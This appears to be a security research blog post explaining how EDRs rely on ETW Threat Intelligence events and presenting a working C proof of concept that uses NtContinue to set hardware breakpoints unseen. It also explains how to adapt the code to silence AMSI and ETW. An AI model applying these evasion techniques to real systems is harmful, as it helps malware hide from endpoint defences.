# https://www.praetorian.com/blog/etw-threat-intelligence-and-hardware-breakpoints/

<!DOCTYPE html><html lang="en-US"> <body class="wp-singular post-template-default single single-post postid-3418 single-format-standard wp-custom-logo wp-embed-responsive wp-theme-hello-elementor wp-child-theme-hello-theme-child-master hello-elementor-default elementor-default elementor-kit-9 elementor-page-537 e--ua-blink e--ua-chrome e--ua-webkit" data-elementor-device-mode="none">     <a class="skip-link screen-reader-text" href="https://www.praetorian.com/blog/etw-threat-intelligence-and-hardware-breakpoints/#content">Skip to content</a>  <div data-elementor-type="single-post" data-elementor-id="537" class="elementor elementor-537 elementor-location-single post-3418 post type-post status-publish format-standard has-post-thumbnail hentry category-uncategorized tag-tools-techniques post_author-rad-kawar" data-elementor-post-type="elementor_library"> <div data-particle_enable="false" data-particle-mobile-disabled="false" class="elementor-element elementor-element-0420b56 e-flex e-con-boxed e-con e-parent" data-id="0420b56" data-element_type="container" data-e-type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}"> <div class="e-con-inner"> <div data-particle_enable="false" data-particle-mobile-disabled="false" class="elementor-element elementor-element-5c9fbee e-con-full e-flex e-con e-child" data-id="5c9fbee" data-element_type="container" data-e-type="container"> <div class="elementor-element elementor-element-a1803d9 elementor-align-center elementor-widget__width-auto elementor-widget elementor-widget-post-info" data-id="a1803d9" data-element_type="widget" data-e-type="widget" data-widget_type="post-info.default"> <ul class="elementor-inline-items elementor-icon-list-items elementor-post-info"> <li class="elementor-icon-list-item elementor-repeater-item-40d019b elementor-inline-item" itemprop="about"> <span class="elementor-icon-list-text elementor-post-info__item elementor-post-info__item--type-terms"> <span class="elementor-post-info__terms-list"> <a href="https://www.praetorian.com/category/uncategorized/" class="elementor-post-info__terms-list-item">Uncategorized</a> </span> </span> </li> </ul> </div> <div class="elementor-element elementor-element-df91114 elementor-widget elementor-widget-theme-post-title elementor-page-title elementor-widget-heading" data-id="df91114" data-element_type="widget" data-e-type="widget" data-widget_type="theme-post-title.default"> <h1 class="elementor-heading-title elementor-size-default">ETW Threat Intelligence and Hardware Breakpoints</h1> </div> <div class="elementor-element elementor-element-b3c2fec elementor-align-center elementor-widget elementor-widget-post-info" data-id="b3c2fec" data-element_type="widget" data-e-type="widget" data-widget_type="post-info.default"> <ul class="elementor-inline-items elementor-icon-list-items elementor-post-info"> <li class="elementor-icon-list-item elementor-repeater-item-d1bfcef elementor-inline-item" itemprop="about"> <span class="elementor-icon-list-text elementor-post-info__item elementor-post-info__item--type-terms"> <span class="elementor-post-info__terms-list"> <a href="https://www.praetorian.com/author/rad-kawar/" class="elementor-post-info__terms-list-item">Rad Kawar</a> </span> </span> </li> <li class="elementor-icon-list-item elementor-repeater-item-97dbfaa elementor-inline-item" itemprop="datePublished"> <a href="https://www.praetorian.com/blog/2025/01/23/"> <span class="elementor-icon-list-icon"> <i aria-hidden="true" class="fas fa-calendar"></i> </span> <span class="elementor-icon-list-text elementor-post-info__item elementor-post-info__item--type-date"> <time>January 23, 2025</time> </span> </a> </li> </ul> </div> </div> </div> </div> <div data-particle_enable="false" data-particle-mobile-disabled="false" class="elementor-element elementor-element-7cbcae5 e-flex e-con-boxed e-con e-parent" data-id="7cbcae5" data-element_type="container" data-e-type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}"> <div class="e-con-inner"> <div class="elementor-element elementor-element-a005860 elementor-widget elementor-widget-theme-post-featured-image elementor-widget-image" data-id="a005860" data-element_type="widget" data-e-type="widget" data-widget_type="theme-post-featured-image.default"> <img width="1920" height="1080" alt="" nitro-lazy-srcset="https://www.praetorian.com/nitropack_static/hagxvXYfntuKaNjMvRDqzXJpjNGtEnoc/assets/images/optimized/rev-5c44e38/www.praetorian.com/wp-content/uploads/2025/01/ETW-Blog-Hero-Image.png 1920w, https://www.praetorian.com/nitropack_static/hagxvXYfntuKaNjMvRDqzXJpjNGtEnoc/assets/images/optimized/rev-5c44e38/www.praetorian.com/wp-content/uploads/2025/01/ETW-Blog-Hero-Image-300x169.png 300w, https://www.praetorian.com/nitropack_static/hagxvXYfntuKaNjMvRDqzXJpjNGtEnoc/assets/images/optimized/rev-5c44e38/www.praetorian.com/wp-content/uploads/2025/01/ETW-Blog-Hero-Image-1024x576.png 1024w, https://www.praetorian.com/nitropack_static/hagxvXYfntuKaNjMvRDqzXJpjNGtEnoc/assets/images/optimized/rev-5c44e38/www.praetorian.com/wp-content/uploads/2025/01/ETW-Blog-Hero-Image-768x432.png 768w, https://www.praetorian.com/nitropack_static/hagxvXYfntuKaNjMvRDqzXJpjNGtEnoc/assets/images/optimized/rev-5c44e38/www.praetorian.com/wp-content/uploads/2025/01/ETW-Blog-Hero-Image-1536x864.png 1536w" nitro-lazy-src="https://www.praetorian.com/nitropack_static/hagxvXYfntuKaNjMvRDqzXJpjNGtEnoc/assets/images/optimized/rev-5c44e38/www.praetorian.com/wp-content/uploads/2025/01/ETW-Blog-Hero-Image.png" class="attachment-full size-full wp-image-3443 nitro-lazy lazyloading" decoding="async" nitro-lazy-empty="" id="NTkxOjY5Mw==-1" src="https://www.praetorian.com/nitropack_static/hagxvXYfntuKaNjMvRDqzXJpjNGtEnoc/assets/images/optimized/rev-5c44e38/www.praetorian.com/wp-content/uploads/2025/01/ETW-Blog-Hero-Image.png"> </div> </div> </div> <section data-particle_enable="false" data-particle-mobile-disabled="false" class="elementor-element elementor-element-d32095e e-flex e-con-boxed e-con e-parent" data-id="d32095e" data-element_type="container" data-e-type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}"> <div class="e-con-inner"> <div data-particle_enable="false" data-particle-mobile-disabled="false" class="elementor-element elementor-element-887d2a1 e-con-full e-flex e-con e-child" data-id="887d2a1" data-element_type="container" data-e-type="container"> <div class="elementor-element elementor-element-7d4cb30 elementor-widget__width-initial elementor-widget elementor-widget-theme-post-content" data-id="7d4cb30" data-element_type="widget" data-e-type="widget" data-widget_type="theme-post-content.default"> <p>Modern Endpoint Detection and Response (EDR) solutions rely heavily on Windows’ Event Tracing for Windows (ETW) Threat Intelligence provider to detect malicious activity without compromising system stability. However, adversaries continue to find ways to bypass these systems stealthily. By leveraging hardware breakpoints at the CPU level, attackers can hook functions and manipulate telemetry in userland without direct kernel patching—challenging traditional defenses. Kernel Patch Protection (PatchGuard) prevents EDR vendors from hooking the System Service Descriptor Table (SSDT) to inspect function call arguments; the ETW Threat Intelligence provider becomes a crucial resource as it supplies various instrumentation data on activities such as memory allocation, thread manipulation, asynchronous procedure calls (APCs), and more from the kernel’s perspective.</p> <p>Hardware breakpoints have been used to hook Windows functionality to subvert or hide user mode telemetry and in turn, bypass AMSI and ETW detections from userland. EDRs have leveraged Threat Intelligence providers to create detections around the abuse of hardware breakpoints.</p> <p>In this blog, we will explore which functions create these ETW events with a kernel debugger, and an alternative method to set up hardware breakpoints to hook functionality <em>without creating</em> the same ETW TI events.</p> <h2 class="wp-block-heading">ETW Threat Intelligence Events in the Kernel</h2> <p>The ETW Threat Intelligence provider logs a variety of security-relevant kernel events. We can identify which kernel functions trigger these events by examining symbols that start with <code>EtwTiLog</code> in a kernel debugging session using WinDbg. For this discussion, we will focus on events of interest and disregard the ones that use the <code>EtwTimLog</code> prefix.</p> <p>In a Kernel Debugging mode session of WinDbg, listing all symbols beginning with <code>EtwTiLog</code> yields the following:</p> <pre class="wp-block-code"><code>
0: kd&gt; x nt!EtwTiLog*
fffff805`27b75280 nt!EtwTiLogDriverObjectLoad (void)
fffff805`27a5f94c nt!EtwTiLogDeviceObjectLoadUnload (void)
fffff805`27759390 nt!EtwTiLogInsertQueueUserApc (void)
fffff805`27a79ecc nt!EtwTiLogProtectExecVm (void)
fffff805`27b6d22c nt!EtwTiLogDriverObjectUnLoad (void)
fffff805`27aaac4c nt!EtwTiLogSetContextThread (void)
fffff805`27d3f76c nt!EtwTiLogSuspendResumeProcess (EtwTiLogSuspendResumeProcess)
fffff805`27a79ce0 nt!EtwTiLogAllocExecVm (EtwTiLogAllocExecVm)
fffff805`27a79b30 nt!EtwTiLogReadWriteVm (EtwTiLogReadWriteVm)
fffff805`27b22544 nt!EtwTiLogMapExecView (EtwTiLogMapExecView)
fffff805`27d3f8d4 nt!EtwTiLogSuspendResumeThread (EtwTiLogSuspendResumeThread)</code></pre> <h2 class="wp-block-heading">Hardware Breakpoints and Privilege Levels</h2> <p>Hardware breakpoints are implemented at the CPU level and rely on the debug registers (DrX). Setting them requires privilege level 0 (PL0). On Windows, user mode code runs at PL3, while the kernel runs at PL0. Normally, user mode applications cannot directly manipulate these registers and must rely on the native API interface that performs syscalls to transition into the kernel and perform these privileged operations on our behalf.</p> <p>Traditionally, user mode applications set hardware breakpoints by calling <code>GetThreadContext</code> and <code>SetThreadContext</code>. The application can then register an exception handler to catch the single-step exceptions triggered by these breakpoints. These debug registers allow processes to hook function addresses without patching any memory! These exceptions can be handled via dynamically allowed <a href="https://learn.microsoft.com/en-us/windows/win32/debug/vectored-exception-handling">Vectored Exception Handlers</a> or <a href="https://learn.microsoft.com/en-us/cpp/cpp/structured-exception-handling-c-cpp?view=msvc-170">Structured Exception Handling</a>.</p> <p>For example, dynamically registering a vectored exception handler that naively continues execution of all single step executions would look like this:</p> <pre class="wp-block-code"><code>
LONG WINAPI exception_handler(const PEXCEPTION_POINTERS ExceptionInfo)
{
    if (ExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionCode == STATUS_SINGLE_STEP)
    {
        ExceptionInfo-&gt;ContextRecord-&gt;EFlags |= (1 &lt;&lt; 16);
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

int main() {
    AddVectoredExceptionHandler(1, exception_handler);
}</code></pre> <h2 class="wp-block-heading">Triggering ETW TI Events via Thread Context Operations</h2> <p>To understand what invokes these functions, we can work backward by loading <code>ntoskrnl.exe</code> into a decompiler or by setting breakpoints on the functions mentioned earlier in WinDbg and inspecting the call stack.</p> <p>We will focus on <code>nt!EtwTiLogSetThreadContext</code> , as the name hints – this is what would likely produce events for thread context operations and manipulation.</p> <pre class="wp-block-code"><code>1: kd&gt; bp nt!EtwTiLogSetContextThread
1: kd&gt; g
</code></pre> <p>The first call stack shows that <code>NtSetInformationThread</code> can trigger this ETW event when called with the thread information class <code>ThreadWow64Context</code>:</p> <pre class="wp-block-code"><code>Breakpoint 0 hit
nt!EtwTiLogSetContextThread:
fffff805`27aaac4c 48895c2408      mov     qword ptr [rsp+8],rbx
1: kd&gt; k
 # Child-SP          RetAddr               Call Site
00 ffffc20e`e2091ce8 fffff805`27aa9ff3     nt!EtwTiLogSetContextThread
01 ffffc20e`e2091cf0 fffff805`27a30efa     nt!PspWow64SetContextThread+0x33f
02 ffffc20e`e2092880 fffff805`27812505     nt!NtSetInformationThread+0xb3a
03 ffffc20e`e2092b00 00007ff8`0e84d694     nt!KiSystemServiceCopyEnd+0x25
04 00000000`019be1f8 00000000`775c1122     ntdll!NtSetInformationThread+0x14
...</code></pre> <p>The second call stack shows that <code>NtSetContextThread</code> (the native API behind <code>SetThreadContext</code>) also triggers this ETW event:</p> <pre class="wp-block-code"><code>1: kd&gt; k
 # Child-SP          RetAddr               Call Site
00 ffffc20e`e3ca7368 fffff805`27c0e68f     nt!EtwTiLogSetContextThread
01 ffffc20e`e3ca7370 fffff805`27d0f0f8     nt!PspSetContextThreadInternal+0x19194f
02 ffffc20e`e3ca7a80 fffff805`27812505     nt!NtSetContextThread+0xb8
03 ffffc20e`e3ca7b00 00007ff8`0e850684     nt!KiSystemServiceCopyEnd+0x25
04 00000009`b9d0f628 00007ff8`0c565bbb     ntdll!NtSetContextThread+0x14
05 00000009`b9d0f630 00007ff6`42041235     KERNELBASE!SetThreadContext+0xb</code></pre> <p>In short, setting a thread’s context using these convention APIs triggers ETW logging and events which EDRs consume to detect suspicious operations, particularly those relating to hardware breakpoints (Debug Registers).</p> <p>As <code>NtSetThreadContext</code> is monitored by ETW TI, EDRs leverage this telemetry source to create detections around hardware breakpoint abuse for the purpose of AMSI/ETW patching.</p> <h2 class="wp-block-heading">Avoiding ETW Detection with NtContinue</h2> <p>To set debug registers without generating the <code>SetThreadContext</code> event, we can leverage the native Windows API function <code>NtContinue</code>.</p> <p>`NtContinue` updates the context of a thread, including its debug registers, without invoking EtwTiLogSetContextThread in the kernel naturally.</p> <p>Thus, it can be used to set hardware breakpoints covertly, bypassing EDR telemetry that relies on SetThreadContext.</p> <p>To confirm we can set debug registers with this function, we can consult the ReactOS source code (an open-source re-implementation of Windows) to see how NtContinue handles debug registers:</p> <ul class="wp-block-list"> <li><a href="https://doxygen.reactos.org/d9/d83/ntoskrnl_2ke_2except_8c.html#aee5276c771f7ce1f6bbeed5e1f38f8a9">NtContinue in ReactOS (except.c)&nbsp;</a></li> <li><a href="https://doxygen.reactos.org/d9/d83/ntoskrnl_2ke_2except_8c.html#a0b62e60a4bba07118820a89befa87e05">KiContinuePreviousModeUser (except.c)</a></li> <li><a href="https://doxygen.reactos.org/df/ddd/ntoskrnl_2ke_2amd64_2context_8c.html#ac656869a0d73f82ee3b763226bbdbeb9">Context to Trap Frame (context.c)</a></li> </ul> <p>Relevant code snippet from <code>KeContextToTrapFrame</code>:<br></p> <pre class="wp-block-code"><code>c
if (ContextFlags &amp; CONTEXT_DEBUG_REGISTERS)
{
    /* Copy the debug registers */
    TrapFrame-&gt;Dr0 = Context-&gt;Dr0;
    TrapFrame-&gt;Dr1 = Context-&gt;Dr1;
    TrapFrame-&gt;Dr2 = Context-&gt;Dr2;
    TrapFrame-&gt;Dr3 = Context-&gt;Dr3;
    TrapFrame-&gt;Dr6 = Context-&gt;Dr6;
    TrapFrame-&gt;Dr7 = Context-&gt;Dr7;

    if ((Context-&gt;SegCs &amp; MODE_MASK) != KernelMode)
    {
        if (TrapFrame-&gt;Dr0 &gt; (ULONG64)MmHighestUserAddress)
            TrapFrame-&gt;Dr0 = 0;
        if (TrapFrame-&gt;Dr1 &gt; (ULONG64)MmHighestUserAddress)
            TrapFrame-&gt;Dr1 = 0;
        if (TrapFrame-&gt;Dr2 &gt; (ULONG64)MmHighestUserAddress)
            TrapFrame-&gt;Dr2 = 0;
        if (TrapFrame-&gt;Dr3 &gt; (ULONG64)MmHighestUserAddress)
            TrapFrame-&gt;Dr3 = 0;
    }
}</code></pre> <h2 class="wp-block-heading">Proof of Concept</h2> <p>By using <code>NtContinue</code>, we can set the debug registers (hardware breakpoints) without creating the ETW event that <code>NtSetContextThread</code> would produce. What follows is a proof of concept that:</p> <ol class="wp-block-list"> <li>Registers our vectored exception handler for single-step exceptions</li> <li>Sets up the debug registers to hook Sleep</li> <li>Verifies our debug registers have been set for our current thread</li> <li>Invokes Sleep and in turn triggers our exception handler <ol class="wp-block-list"> <li>Exception handler sets the instruction pointer to the address of a ret gadget</li> <li>Sets the resume flag to continue execution</li> </ol> </li> <li>Exits</li> </ol> <pre class="wp-block-code"><code>c
#include &lt;Windows.h&gt;
#include &lt;stdio.h&gt;

#define IMPORTAPI( DLLFILE, FUNCNAME, RETTYPE, ...)\
typedef RETTYPE( WINAPI* type##FUNCNAME )( __VA_ARGS__ );\
type##FUNCNAME FUNCNAME = (type##FUNCNAME)GetProcAddress((LoadLibraryW(DLLFILE), GetModuleHandleW(DLLFILE)), #FUNCNAME);

uintptr_t find_gadget(size_t function, BYTE* stub, size_t size, size_t dist)
{
    for (size_t i = 0; i &lt; dist; i++)
    {
        if (memcmp((LPVOID)(function + i), stub, size) == 0) {
            return (function + i);
        }
    }
    return 0ull;
}

LONG WINAPI exception_handler(const PEXCEPTION_POINTERS ExceptionInfo)
{
    if (ExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionCode == STATUS_SINGLE_STEP)
    {
        printf("7. Single step exception\n");
  printf("\tDr0: %p\tDr7: %p\n", (PVOID)ExceptionInfo-&gt;ContextRecord-&gt;Dr0, (PVOID)ExceptionInfo-&gt;ContextRecord-&gt;Dr7);

        PVOID ret_addr = find_gadget(ExceptionInfo-&gt;ContextRecord-&gt;Rip, "\xc3", 1, 100000);
  printf("8. Found ret gadget at %p\n", ret_addr);
        ExceptionInfo-&gt;ContextRecord-&gt;Rip = (DWORD64)ret_addr;
        ExceptionInfo-&gt;ContextRecord-&gt;EFlags |= (1 &lt;&lt; 16);
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

int main()
{
    IMPORTAPI(L"NTDLL.dll", NtContinue, NTSTATUS, PCONTEXT, BOOLEAN);

    AddVectoredExceptionHandler(1, exception_handler);
    printf("1. Exception handler registered\n");

    CONTEXT context_thread = { 0 };
    context_thread.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    RtlCaptureContext(&amp;context_thread);
    printf("2. Thread context captured\n");
 printf("\tDr0: %p\tDr7: %p\n", (PVOID)context_thread.Dr0, (PVOID)context_thread.Dr7);

    context_thread.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    context_thread.Dr0 = GetProcAddress(GetModuleHandleW(L"KERNEL32.dll"), "Sleep");
    context_thread.Dr7 |= 1ull &lt;&lt; (2 * 0);
    context_thread.Dr7 &amp;= ~(3ull &lt;&lt; (16 + 4 * 0));
    context_thread.Dr7 &amp;= ~(3ull &lt;&lt; (18 + 4 * 0));
    printf("3. Debug register values set\n");
 printf("\tDr0: %p\tDr7: %p\n", (PVOID)context_thread.Dr0, (PVOID)context_thread.Dr7);

    NtContinue(&amp;context_thread, FALSE);
    printf("4. Thread context set\n");

    context_thread.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    context_thread.Dr0 = context_thread.Dr7 = 0;
    GetThreadContext(GetCurrentThread(), &amp;context_thread);
 printf("5. Thread context retrieved\n");
 printf("\tDr0: %p\tDr7: %p\n", (PVOID)context_thread.Dr0, (PVOID)context_thread.Dr7);

 printf("6. Sleeping for 0xDEADBEEF\n");
    Sleep(0xDEADBEEF);

 printf("9. Program finished\n");
    return 0;
}</code></pre> <p><em>We can use<code> sxn sse</code> in WinDbg to notify a single step exception and allow the event to be passed on as not handled by our Kernel Debugging session, so our exception can be handled by our registered exception handler.</em></p> <pre class="wp-block-code"><code>0: kd&gt; g
Single step exception - code 80000004 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
KERNEL32!SleepStub:
0033:00007ff8`0e1ab0e0 48ff25398d0600  jmp     qword ptr [KERNEL32!_imp_Sleep (00007ff8`0e213e20)]
</code></pre> <p>And then from the output of our proof of concept, we can verify everything worked:</p> <pre class="wp-block-code"><code>1. Exception handler registered
2. Thread context captured
        Dr0: 0000000000000000   Dr7: 0000000000000000
3. Debug register values set
        Dr0: 00007FF80E1AB0E0   Dr7: 0000000000000001
4. Thread context set
5. Thread context retrieved
        Dr0: 00007FF80E1AB0E0   Dr7: 0000000000000401
6. Sleeping for 0xDEADBEEF
7. Single step exception
        Dr0: 00007FF80E1AB0E0   Dr7: 0000000000000401
8. Found ret gadget at 00007FF80E1AB1B1
9. Program finished</code></pre> <p>We see that <code>NtContinue</code> has successfully set the debug registers (Dr0/Dr7), passed execution flow to our exception handler and naturally avoided invoking <code>nt!EtwTiLogSetContextThread</code>.</p> <h2 class="wp-block-heading">EDR Evasion Applications</h2> <h3 class="wp-block-heading">ETW/AMSI Hooking</h3> <p>To implement a patchless approach using our PoC, you can update the example to set the value of Dr0 through to Dr3 (while updating the relevant bits in Dr7) to the addresses of <code>ntdll!NtTraceEvent</code> or <code>amsi!AmsiScanBuffer</code>. Additionally, you can update the <code>RAX</code> register (<a href="https://learn.microsoft.com/en-us/cpp/build/x64-calling-convention?view=msvc-170">per the x64 calling convention</a>), where the return value is stored, to supply a return status code.</p> <h3 class="wp-block-heading">Clearing Debug Registers</h3> <p>EDRs may also use hardware breakpoints to prevent unhooking, but by clearing the debug registers via <code>NtContinue</code> we can avoid triggering this as follows:</p> <pre class="wp-block-code"><code>context_thread.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    context_thread.Dr0 = context_thread.Dr1 = context_thread.Dr2 = context_thread.Dr3 = context_thread.Dr7 = 0;
    NtContinue(&amp;context_thread, FALSE);</code></pre> <h2 class="wp-block-heading">Conclusion</h2> <p>We have explored how EDRs rely on ETW Threat Intelligence providers to gather insights into security-related events without directly hooking into kernel code. We examined how hardware breakpoints are traditionally set, why they trigger ETW events, and how using NtContinue can avoid this instrumentation. This matters because it highlights a technique adversaries can use to evade and maintain stealth while implementing “patchless” hooks that prevent AMSI scanning and avoid ETW logging.</p> <p></p> </div> </div> </div> </section> <section data-particle_enable="false" data-particle-mobile-disabled="false" class="elementor-element elementor-element-56fa4c1 e-flex e-con-boxed e-con e-parent" data-id="56fa4c1" data-element_type="container" data-e-type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}"> <div class="e-con-inner"> <div data-particle_enable="false" data-particle-mobile-disabled="false" class="elementor-element elementor-element-9db27e1 e-con-full e-flex e-con e-child" data-id="9db27e1" data-element_type="container" data-e-type="container"> <div class="elementor-element elementor-element-020bef5 elementor-widget elementor-widget-heading" data-id="020bef5" data-element_type="widget" data-e-type="widget" data-widget_type="heading.default"> <h2 class="elementor-heading-title elementor-size-default">About the Authors</h2> </div> </div> <div data-particle_enable="false" data-particle-mobile-disabled="false" class="elementor-element elementor-element-770ad1e e-con-full e-flex e-con e-child" data-id="770ad1e" data-element_type="container" data-e-type="container"> <div class="elementor-element elementor-element-b1e118c elementor-widget elementor-widget-shortcode" data-id="b1e118c" data-element_type="widget" data-e-type="widget" data-widget_type="shortcode.default"> <div class="elementor-shortcode"> <div class="author-bios"> <div class="author-bio"><div class="author-photo"></div><div class="author-info"><h3><a href="https://www.praetorian.com/author/rad-kawar/">Rad Kawar</a></h3><p></p><div class="author-icon-wrap"></div></div></div> </div> </div> </div> </div> </div> </section> <div data-particle_enable="false" data-particle-mobile-disabled="false" class="elementor-element elementor-element-5c7ba22 e-con-full e-flex e-con e-parent" data-id="5c7ba22" data-element_type="container" data-e-type="container"> <div class="elementor-element elementor-element-0b16b7c elementor-widget elementor-widget-shortcode" data-id="0b16b7c" data-element_type="widget" data-e-type="widget" data-widget_type="shortcode.default"> <div class="elementor-shortcode"> <div data-elementor-type="container" data-elementor-id="2557" class="elementor elementor-2557" data-elementor-post-type="elementor_library"> <section data-particle_enable="false" data-particle-mobile-disabled="false" class="elementor-element elementor-element-2462f2d8 e-flex e-con-boxed e-con e-parent" data-id="2462f2d8" data-element_type="container" data-e-type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}"> <div class="e-con-inner"> <div data-particle_enable="false" data-particle-mobile-disabled="false" class="elementor-element elementor-element-8f5c8bf e-flex e-con-boxed e-con e-child" data-id="8f5c8bf" data-element_type="container" data-e-type="container"> <div class="e-con-inner"> <div class="elementor-element elementor-element-85ded54 elementor-widget__width-initial elementor-widget elementor-widget-heading" data-id="85ded54" data-element_type="widget" data-e-type="widget" data-widget_type="heading.default"> <h2 class="elementor-heading-title elementor-size-default">Catch the Latest</h2> </div> <div class="elementor-element elementor-element-9804a0b elementor-widget__width-initial elementor-widget elementor-widget-text-editor" data-id="9804a0b" data-element_type="widget" data-e-type="widget" data-widget_type="text-editor.default"> <p>Catch our latest exploits, news, articles, and events.</p> </div> <div class="elementor-element elementor-element-bea62ac elementor-widget__width-inherit elementor-grid-3 elementor-grid-tablet-2 elementor-grid-mobile-1 elementor-widget elementor-widget-loop-grid" data-id="bea62ac" data-element_type="widget" data-e-type="widget" data-settings="{&quot;template_id&quot;:&quot;1992&quot;,&quot;_skin&quot;:&quot;post&quot;,&quot;columns&quot;:&quot;3&quot;,&quot;columns_tablet&quot;:&quot;2&quot;,&quot;columns_mobile&quot;:&quot;1&quot;,&quot;edit_handle_selector&quot;:&quot;[data-elementor-type=\&quot;loop-item\&quot;]&quot;,&quot;row_gap&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;row_gap_tablet&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;row_gap_mobile&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]}}" data-widget_type="loop-grid.post"> <div class="elementor-widget-container"> <div class="elementor-loop-container elementor-grid" role="list">  <div data-elementor-type="loop-item" data-elementor-id="1992" class="elementor elementor-1992 e-loop-item e-loop-item-9409 post-9409 post type-post status-publish format-standard has-post-thumbnail hentry category-ai-security category-open-source-tools post_author-connor-slack post_author-domenic-lo-iacono" data-elementor-post-type="elementor_library" data-custom-edit-handle="1"> <div data-eael-wrapper-link="eael-wrapper-link-03ccb64" data-particle_enable="false" data-particle-mobile-disabled="false" class="elementor-element elementor-element-03ccb64 e-flex e-con-boxed e-con e-parent" data-id="03ccb64" data-element_type="container" data-e-type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}"> <div class="e-con-inner"> <div class="elementor-element elementor-element-03832b4 elementor-absolute elementor-widget elementor-widget-post-info" data-id="03832b4" data-element_type="widget" data-e-type="widget" data-settings="{&quot;_position&quot;:&quot;absolute&quot;}" data-widget_type="post-info.default"> <ul class="elementor-inline-items elementor-icon-list-items elementor-post-info"> <li class="elementor-icon-list-item elementor-repeater-item-e044213 elementor-inline-item" itemprop="about"> <span class="elementor-icon-list-text elementor-post-info__item elementor-post-info__item--type-terms"> <span class="elementor-post-info__terms-list"> <a href="https://www.praetorian.com/category/ai-security/" class="elementor-post-info__terms-list-item">AI Security</a>, <a href="https://www.praetorian.com/category/open-source-tools/" class="elementor-post-info__terms-list-item">Open Source Tools</a> </span> </span> </li> </ul> </div> <div class="elementor-element elementor-element-4ba8c0d elementor-widget elementor-widget-post-info" data-id="4ba8c0d" data-element_type="widget" data-e-type="widget" data-widget_type="post-info.default"> <ul class="elementor-inline-items elementor-icon-list-items elementor-post-info"> <li class="elementor-icon-list-item elementor-repeater-item-205ab6e elementor-inline-item" itemprop="datePublished"> <a href="https://www.praetorian.com/blog/2026/02/17/"> <span class="elementor-icon-list-text elementor-post-info__item elementor-post-info__item--type-date"> <time>February 17, 2026</time> </span> </a> </li> </ul> </div>  <div data-eael-wrapper-link="eael-wrapper-link-25de712" class="elementor-element elementor-element-25de712 elementor-widget elementor-widget-theme-post-title elementor-page-title elementor-widget-heading" data-id="25de712" data-element_type="widget" data-e-type="widget" data-widget_type="theme-post-title.default"> <h2 class="elementor-heading-title elementor-size-default"><a href="https://www.praetorian.com/blog/mcp-server-security-the-hidden-ai-attack-surface/">MCP Server Security: The Hidden AI Attack Surface</a></h2> <a class="eael-wrapper-link-25de712 --eael-wrapper-link-tag" href="https://www.praetorian.com/blog/mcp-server-security-the-hidden-ai-attack-surface/" style="background: transparent; border: none; position: absolute; height: 100%; width: 100%; z-index: 9999; top: 0px; left: 0px;"></a></div> <div class="elementor-element elementor-element-d8430d4 elementor-hidden-desktop elementor-hidden-tablet elementor-hidden-mobile elementor-widget elementor-widget-button" data-id="d8430d4" data-element_type="widget" data-e-type="widget" data-widget_type="button.default"> <a class="elementor-button elementor-button-link elementor-size-sm" href="https://www.praetorian.com/blog/mcp-server-security-the-hidden-ai-attack-surface/"> <span class="elementor-button-content-wrapper"> <span class="elementor-button-icon"> <i aria-hidden="true" class="fas fa-chevron-right"></i> </span> <span class="elementor-button-text">Read More</span> </span> </a> </div> </div> <a class="eael-wrapper-link-03ccb64 --eael-wrapper-link-tag" href="https://www.praetorian.com/blog/mcp-server-security-the-hidden-ai-attack-surface/" style="background: transparent; border: none; position: absolute; height: 100%; width: 100%; z-index: 9999; top: 0px; left: 0px;"></a></div> </div>  <div data-elementor-type="loop-item" data-elementor-id="1992" class="elementor elementor-1992 e-loop-item e-loop-item-9388 post-9388 post type-post status-publish format-standard has-post-thumbnail hentry category-ai-security category-open-source-tools tag-tools-techniques post_author-khael-kugler" data-elementor-post-type="elementor_library" data-custom-edit-handle="1"> <div data-eael-wrapper-link="eael-wrapper-link-03ccb64" data-particle_enable="false" data-particle-mobile-disabled="false" class="elementor-element elementor-element-03ccb64 e-flex e-con-boxed e-con e-parent" data-id="03ccb64" data-element_type="container" data-e-type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}"> <div class="e-con-inner"> <div class="elementor-element elementor-element-03832b4 elementor-absolute elementor-widget elementor-widget-post-info" data-id="03832b4" data-element_type="widget" data-e-type="widget" data-settings="{&quot;_position&quot;:&quot;absolute&quot;}" data-widget_type="post-info.default"> <ul class="elementor-inline-items elementor-icon-list-items elementor-post-info"> <li class="elementor-icon-list-item elementor-repeater-item-e044213 elementor-inline-item" itemprop="about"> <span class="elementor-icon-list-text elementor-post-info__item elementor-post-info__item--type-terms"> <span class="elementor-post-info__terms-list"> <a href="https://www.praetorian.com/category/ai-security/" class="elementor-post-info__terms-list-item">AI Security</a>, <a href="https://www.praetorian.com/category/open-source-tools/" class="elementor-post-info__terms-list-item">Open Source Tools</a> </span> </span> </li> </ul> </div> <div class="elementor-element elementor-element-4ba8c0d elementor-widget elementor-widget-post-info" data-id="4ba8c0d" data-element_type="widget" data-e-type="widget" data-widget_type="post-info.default"> <ul class="elementor-inline-items elementor-icon-list-items elementor-post-info"> <li class="elementor-icon-list-item elementor-repeater-item-205ab6e elementor-inline-item" itemprop="datePublished"> <a href="https://www.praetorian.com/blog/2026/02/13/"> <span class="elementor-icon-list-text elementor-post-info__item elementor-post-info__item--type-date"> <time>February 13, 2026</time> </span> </a> </li> </ul> </div>  <div data-eael-wrapper-link="eael-wrapper-link-25de712" class="elementor-element elementor-element-25de712 elementor-widget elementor-widget-theme-post-title elementor-page-title elementor-widget-heading" data-id="25de712" data-element_type="widget" data-e-type="widget" 